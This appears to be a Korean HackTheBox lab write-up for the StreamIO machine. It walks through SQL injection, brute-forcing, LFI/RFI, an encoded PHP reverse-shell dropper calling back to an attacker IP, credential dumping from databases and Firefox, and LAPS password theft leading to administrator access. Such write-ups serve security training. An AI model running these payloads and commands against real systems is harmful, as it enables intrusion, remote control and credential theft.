# StreamIO - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,443,445,464,49667,49677,49678,49704,53,593,5985,636,80,88,9389 -sC -sV -vv -oA StreamIO 10.129.4.99
```
<img width="1205" height="429" alt="image" src="https://github.com/user-attachments/assets/687213bd-69d6-4e4e-b494-f9da5c6e2fdf" />
<img width="1205" height="225" alt="image" src="https://github.com/user-attachments/assets/fc8ae195-fc95-487b-9e93-ec821b39227d" />

- HTTP
- LDAP(389)
- HTTPS
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `streamIO.htb`와 `watch.streamIO.htb`추가.
<img width="1205" height="74" alt="image" src="https://github.com/user-attachments/assets/76e192c4-9f74-411a-8a53-b7200f06ee2a" />

---
## HTTPS
### banner grabbing
<img width="1205" height="425" alt="image" src="https://github.com/user-attachments/assets/91b21a5b-8b64-4a3e-90cd-937f545dbd83" />

### SQL Injection
- `watch.streamIO.htb`의 하위 경로 탐색하여 `search.php`를 발견.
```bash
feroxbuster -u https://watch.streamIO.htb -x php,md,txt -C 404,405 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --insecure
```
<img width="1205" height="181" alt="image" src="https://github.com/user-attachments/assets/a2e01440-0b19-46a8-b62d-c2885b7440a0" />

<br>
<br>

- `a'`을 입력할 경우 아무것도 출력이 되지 않음.
- `a';-- -`를 입력할 경우 출력 됨.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9ed57346-c29b-4f49-83be-b8423780d21d" />

<br>
<br>

- 입력한 문자열 전후로 와일드카드가 사용되는 것처럼 보임.
<img width="488" height="41" alt="image" src="https://github.com/user-attachments/assets/d076bdcb-579c-4d1a-9bf6-5b6d211b5076" />

<br>
<br>

- `UNION SELECT`를 사용하여 인젝션 테스트.
<img width="1546" height="649" alt="image" src="https://github.com/user-attachments/assets/3b835f4c-fd6f-4aca-b004-fc7a65f33107" />

<br>
<br>

- `MSSQL`
<img width="1537" height="565" alt="image" src="https://github.com/user-attachments/assets/d873a46e-57ca-4bfb-91ac-65e5708a6e46" />

<br>
<br>

- 데이터베이스 목록 조회.
- `STREAMIO`, `streamio_backup` 데이터베이스 발견.
<img width="1537" height="731" alt="image" src="https://github.com/user-attachments/assets/a8230dbf-6cbd-41b9-b23b-98d8fc89e9ba" />

<br>
<br>

- `streamio_backup` 데이터베이스는 조회 실패.
- `STREAMIO` 데이터베이스의 테이블 목록 조회.
<img width="1537" height="731" alt="image" src="https://github.com/user-attachments/assets/124b1827-71ea-4a49-834e-07216137134f" />

<br>
<br>

- 컬럼 조회.
<img width="1537" height="731" alt="image" src="https://github.com/user-attachments/assets/38422a5f-6d82-4742-b8aa-4e99f44c26ed" />

<br>
<br>

- `username`과 `password`를 추출.
<img width="1537" height="731" alt="image" src="https://github.com/user-attachments/assets/aeaf7b1e-de93-441b-8a2b-70daab37e200" />

<br>
<br>

- https://crackstation.net/
- 해시 크래킹하여 비밀번호 획득.
<img width="1020" height="657" alt="image" src="https://github.com/user-attachments/assets/266bae4b-51e0-47e7-ad68-124fc4819017" />
<img width="1020" height="336" alt="image" src="https://github.com/user-attachments/assets/6b284b28-4922-47fa-b275-79799c3ad100" />

### RFI
- `SMB`로그인 시도하였으나 실패.
- `streamio.htb` 메인페이지에서 로그인 버튼 발견.
<img width="1100" height="602" alt="dd" src="https://github.com/user-attachments/assets/69a2c5dc-2ad8-449c-ab27-a985757a5edd" />

<br>
<br>

- `hydra`를 사용하여 로그인 시도.
-  `yoshihide:66boysandgirls..` 로그인 성공.
```bash
hydra streamio.htb -L users -P passwords https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```
<img width="1205" height="249" alt="image" src="https://github.com/user-attachments/assets/e699f4b7-4e60-407b-90e7-8ea0c569d2e8" />

<br>
<br>

- 특별한 정보를 찾을 수 없어 경로 탐색.
- `/admin`경로 발견.
```bash
feroxbuster -u https://streamIO.htb -x php,md,txt -C 404,405 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --insecure
```
<img width="1205" height="514" alt="image" src="https://github.com/user-attachments/assets/84ef96c1-369c-4f74-aff2-ffeef9c1845f" />

<br>
<br>

- `/admin/master.php`로 접속할 경우 오류 발생.
<img width="417" height="137" alt="image" src="https://github.com/user-attachments/assets/c0f2f27b-4611-4cf7-811a-e638cfc97bce" />

<br>
<br>

- `/admin`경로에서 각각의 버튼에서 각각의 파라미터를 사용하는 것을 확인.
- 모든 파라미터에서 취약점을 발견하기 어려워 다른 파라미터가 있는지 탐색.
- `debug` 파라미터 발견.
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=i6rivusdp7nvq5r79rtocd89g5' -u 'https://streamio.htb/admin/index.php?FUZZ=value' -fs 1678
```
<img width="1205" height="127" alt="image" src="https://github.com/user-attachments/assets/4f786a1a-4411-47a1-b9dd-aaabb27cf9cd" />

<br>
<br>

- `debug` 파라미터에서 `LFI` 성공.
<img width="1420" height="361" alt="image" src="https://github.com/user-attachments/assets/e751cfa6-e4f8-4abc-bf50-b6e25ff4e735" />

<br>
<br>

- `php://filter`를 사용하여 인코딩 된 `index.php` 획득.
<img width="1547" height="751" alt="image" src="https://github.com/user-attachments/assets/9091dfc7-fae4-45f7-a4f7-eaffdcdd157f" />

<br>
<br>

- 경로 탐색에서 발견된 `master.php` 코드 획득.
<img width="1547" height="751" alt="image" src="https://github.com/user-attachments/assets/5c5832cf-ec0c-44c5-8692-e722eff0dc6c" />

<br>
<br>

- `index.php`에서 `debug`파라미터에서 `index.php`가 아닌 값을 줄 경우 서버에서 해당 php파일을 가져올 수 있음.
<img width="1202" height="401" alt="image" src="https://github.com/user-attachments/assets/129a62db-8c4f-4393-a60b-e8c77e1086da" />

<br>
<br>

- `master.php`를 `debug` 파라미터의 값으로 전달하여 접속.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/2356a084-6653-421a-869a-1d0c3859b5e8" />

<br>
<br>

- `master.php`에서 `include` 파라미터를 사용하여 `POST`요청을 시도할 경우 `include`로 포함된 내용을 실행.
<img width="1205" height="203" alt="image" src="https://github.com/user-attachments/assets/39b9d664-6cd5-49e2-876d-45216a0a9213" />

<br>
<br>

- `RFI` 시도하여 성공.
<img width="1546" height="471" alt="image" src="https://github.com/user-attachments/assets/f8891d1b-cbad-4316-a642-29de95f7383a" />
<img width="1203" height="98" alt="image" src="https://github.com/user-attachments/assets/a8471aac-3883-4d33-ac37-beee24db474f" />

<br>
<br>

- 리버스 셸 코드 생성하여 실행.
- `file_get_contents`함수로 인해서 앞과 뒤의 `<?php ?>`를 제외시켜 줘야 한다.
```php
header('Content-type: text/plain');
$ip   = "10.10.14.22"; //change this 
$port = "443"; //change this
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
```
<img width="772" height="467" alt="image" src="https://github.com/user-attachments/assets/f8e50a72-3ada-48c4-8f7e-27564bda982a" />

<br>
<br>

- 셸 획득.
<img width="1205" height="276" alt="image" src="https://github.com/user-attachments/assets/d57137e4-ddc1-4032-8872-c54de2b43535" />

---
## Shell as nikk37
- `c:\inetpub\streamio.htb\register.php`에서 DB계정 발견.
<img width="1205" height="251" alt="image" src="https://github.com/user-attachments/assets/7e70c5a4-390f-438a-bd63-d22118c303af" />

<br>
<br>

- `MSSQL`을 사용하고 있어서 `sqlcmd.exe` 발견.
<img width="1205" height="80" alt="image" src="https://github.com/user-attachments/assets/a0b93bab-cb5f-4817-b3cb-8ee70696cf3e" />

<br>
<br>

- `sqlcmd`를 사용하여 이전에 확인하지 못했던 `streamio_backup`데이터베이스 탐색.
- 테이블 확인.
```powershell
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables"
```
<img width="1205" height="252" alt="image" src="https://github.com/user-attachments/assets/b2feb10e-2c59-4701-8819-a5b387d15823" />

<br>
<br>

- 컬럼 조회.
```powershell
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select column_name from streamio_backup.information_schema.columns"
```
<img width="1205" height="451" alt="image" src="https://github.com/user-attachments/assets/dc1c0c2b-165b-4e20-9413-df660cbb5e2d" />

<br>
<br>

- 유저명과 비밀번호 발견.
```powershell
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select username,password from streamio_backup..users"
```
<img width="1205" height="317" alt="image" src="https://github.com/user-attachments/assets/4a6e4ec3-ba56-4f3d-b469-c286978e6943" />

<br>
<br>

- 비밀번호 크래킹.
<img width="1017" height="287" alt="image" src="https://github.com/user-attachments/assets/ea236a2a-e20e-4796-b3c4-376023a03d78" />

<br>
<br>

- `nikk37:get_dem_girls2@yahoo.com` 로그인 성공.
```bash
nxc smb 10.129.4.99 -u users -p passwords --continue-on-success
```
<img width="1204" height="116" alt="image" src="https://github.com/user-attachments/assets/29891582-3027-4fd1-bf20-8fde5e120bdd" />

<br>
<br>

- `winrm` 로그인 성공.
<img width="1204" height="204" alt="image" src="https://github.com/user-attachments/assets/6aefcd42-84d6-4799-8ab9-8b031bdd2df0" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.4.99 -u nikk37 -p 'get_dem_girls2@yahoo.com'
```
<img width="1204" height="272" alt="image" src="https://github.com/user-attachments/assets/f03f7ff9-7678-4895-b25b-09ca72d95ea5" />

---
## Auth as JDgodd
- 유저목록 수집.
```bash
nxc smb 10.129.4.99 -u nikk37 -p 'get_dem_girls2@yahoo.com' --users
```
<img width="1204" height="408" alt="image" src="https://github.com/user-attachments/assets/b2b7186c-66aa-4da1-96f8-d47791e33108" />

<br>
<br>

- `bloodhound` 정보 수집.
```powershell
.\SharpHound.exe
```
```bash
rusthound-ce -d streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```
<img width="1204" height="297" alt="image" src="https://github.com/user-attachments/assets/1e8487ce-1788-46d2-bbc6-ba46d7e84d88" />

<br>
<br>

- 특별한 정보 찾을 수 없어 `winpeas`를 실행.
- `firefox credential file` 발견.
<img width="1204" height="123" alt="image" src="https://github.com/user-attachments/assets/629982f5-9cf6-4ff6-8ff4-1431af387dcf" />

<br>
<br>

- https://github.com/lclevy/firepwd
- 로컬로 해당 폴더를 다운로드 받아서 복호화 진행.
```bash
python3 firepwd.py -d br53rxeg.default-release
```
<img width="1204" height="92" alt="image" src="https://github.com/user-attachments/assets/f3da5372-b6d1-4e4c-a35e-58b268d9bfed" />

<br>
<br>

- `JDgodd:JDg0dd1s@d0p3cr3@t0r` 로그인 성공.
```bash
nxc smb 10.129.4.99 -u users -p passwords --continue-on-success
```
<img width="1204" height="185" alt="image" src="https://github.com/user-attachments/assets/72430edf-5e3a-44f9-aabc-94b6d65a5e34" />

---
## Privesc
- `core staff`그룹에 `jdgodd`를 추가한 후 `ReadLAPSPassword`권한으로 해시를 발견할 수 있을 것이라 예상.
<img width="1211" height="473" alt="image" src="https://github.com/user-attachments/assets/945f39ef-0a5a-41ae-bf27-6234f3d85675" />

<br>
<br>

- `jdgodd`를 `core staff` 그룹에 추가.
```bash
bloodyAD -d streamio.htb --host 10.129.4.99 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember 'core staff' jdgodd
```
<img width="1203" height="79" alt="image" src="https://github.com/user-attachments/assets/df3a3288-a121-49d0-b6df-e5dadc1d1eab" />

<br>
<br>

- `LAPS` 비밀번호 탈취.
```bash
nxc smb 10.129.4.99 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```
<img width="1203" height="162" alt="image" src="https://github.com/user-attachments/assets/da366ca6-b72a-47b0-9c60-09bb56da4a61" />

<br>
<br>

- `administrator:]R4(0&5f9sAk+L` 로그인 성공.
<img width="1203" height="203" alt="image" src="https://github.com/user-attachments/assets/2c67ca2b-040c-4752-a1d4-4d4847aa4aee" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.4.99 -u administrator -p ']R4(0&5f9sAk+L'
```
<img width="1203" height="288" alt="image" src="https://github.com/user-attachments/assets/7634231a-d5d8-4f09-b670-10a2117ff3c9" />

---
## FLAG
- `c:\users\nikk37\desktop\user.txt`
<img width="1202" height="205" alt="image" src="https://github.com/user-attachments/assets/a385dd91-9efd-49d9-8059-16b46396b4a7" />

<br>
<br>

- `c:\users\martin\desktop\root.txt`
<img width="1202" height="205" alt="image" src="https://github.com/user-attachments/assets/f09162cf-d6d9-405b-9b05-d8d3d6150fd9" />
